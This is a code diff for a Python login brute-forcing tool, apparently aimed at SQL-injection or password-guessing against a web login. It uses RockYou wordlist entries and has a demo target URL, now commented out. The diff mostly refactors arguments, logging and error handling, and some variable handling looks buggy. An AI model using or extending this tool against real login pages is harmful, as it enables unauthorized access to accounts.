@@ -1,12 +1,15 @@
 import logging
 import requests
 import sys
+import os
+lib_path = os.path.abspath(os.path.join(os.path.dirname(__file__)))
+sys.path.append(lib_path)
 from datetime import datetime
 from colorama import Fore, init
 from wordlist import rockyou
-import os
 from random import choice, randint
 import re
+
 
 init()
 
@@ -18,11 +21,11 @@ class Brute:
         self.target = target
         self.chlwr = [chr(ord('A') + i) for i in range(26)]
         self.chlup = [chr(ord('a') + i) for i in range(26)]
-        self.logfile = f"SQLJ{choice(self.chlwr)}.log"
+        self.logfile = f"SQLJ.log"
         logging.basicConfig(filename=self.logfile, level=logging.DEBUG)
         logging.info(f"Log file created with name: {self.logfile}")
         self.sliced = sliced
-        self.word = list(rockyou(count=10000000))
+        self.word = list(rockyou(count=self.count))
 
     def target_selection_syn(self):
         try:
@@ -62,7 +65,7 @@ class Brute:
                         break
 
                     # Use string formatting to insert variable values
-                    line = f"Testing payload: username={payload['username']}, password={payload['password']}\nstatus code:{req.status_code}"
+                    line = f"Testing payload\n username={payload['username']}\n password={payload['password']}\nstatus code:{req.status_code}\ntarget:{self.target}"
 
                     # Clear the console
                     os.system('cls' if os.name == 'nt' else 'clear')
@@ -84,13 +87,19 @@ class Brute:
         except KeyboardInterrupt:
             print("Aborted")
             
+        except ConnectionAbortedError:
+            print("Connection Aborted")
+        
+        except ConnectionRefusedError:
+            print("Connection Refused")
+            
 
-def run_brute_force():
+def run_brute_force(url,sl,cnt):
 
-    obj = Brute(10000000000000, target="http://testfire.net/login.jsp", sliced=10000)
+    obj = Brute(count=cnt, target=url, sliced=sl)
     sliced_generator = obj.word
     sliced_list = list(sliced_generator)
     obj.count = len(sliced_list)
     obj.bruteforce_sqlj()
 
-run_brute_force()
+# run_brute_force("http://testfire.net/login.jsp",0,cnt=0)
